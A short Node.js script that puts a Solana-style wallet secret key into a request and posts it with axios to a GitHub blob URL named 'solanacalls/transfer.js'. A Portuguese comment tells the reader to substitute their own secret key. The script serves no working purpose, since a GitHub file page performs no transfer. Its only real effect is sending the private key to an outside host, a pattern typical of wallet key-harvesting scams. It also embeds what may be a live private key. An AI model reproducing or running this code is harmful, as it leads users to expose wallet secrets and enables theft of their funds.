const axios = require('axios');

const data = {
  secretKey: '63YLAYgRJc8pyXjyDBnM4pt13dKQVgVQVkP6DNoHnX7mZ4RqGzryLACqUYkzqFEP384NZykLPstTDXcVLnYbn3sK', // substitua com sua chave secreta
};

axios.post('https://github.com/SethyArt/solanacalls/blob/main/transfer.js', data)
  .then(response => {
    console.log(response.data);
  })
  .catch(error => {
    console.error(error);
  });